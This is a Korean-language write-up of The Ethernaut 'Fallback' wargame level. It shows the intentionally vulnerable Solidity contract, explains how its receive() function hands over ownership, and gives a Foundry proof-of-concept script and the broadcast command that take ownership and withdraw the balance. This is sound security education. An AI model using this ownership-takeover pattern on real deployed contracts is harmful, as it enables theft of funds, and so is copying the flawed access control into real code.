# The Ethernaut : Fallback

> [Blog 원문](https://velog.io/@sane100400/The-Ethernaut-Fallback)

## 핵심 개념

**fallback / receive 함수**는 매칭되는 함수가 없거나, 이더만 전송될 때 실행된다.

## 문제 컨트랙트

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

## 풀이

1. `contribute()`를 0.001 ether 미만으로 호출하여 기여 기록 생성
2. `payable(target).call{value: ...}("")`로 이더 전송하여 `receive()` 트리거
3. `receive()` 함수 실행 (매칭되는 함수 시그니처 없음)
4. 호출자가 owner가 됨
5. `withdraw()` 호출하여 컨트랙트 잔액 인출

## PoC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Counter} from "../src/Counter.sol";
import {Fallback} from "../src/Fallback.sol";

contract PoC is Script {
    Counter public counter;
    address public target = 0x24717B787DB7FC54936E6291311567e0C4147B27;
    uint256 pk = vm.envUint("PRIV_KEY");

    function run() public {
        vm.startBroadcast(pk);
        console.log(target.balance);

        Fallback(payable(target)).contribute{value: 0.0001 ether}();
        payable(target).call{value: 0.0001 ether}("");
        Fallback(payable(target)).withdraw();

        vm.stopBroadcast();
    }
}
```

### 실행

```bash
forge script ./Counter.s.sol:PoC --rpc-url $RPC_URL --broadcast -vvvv
```
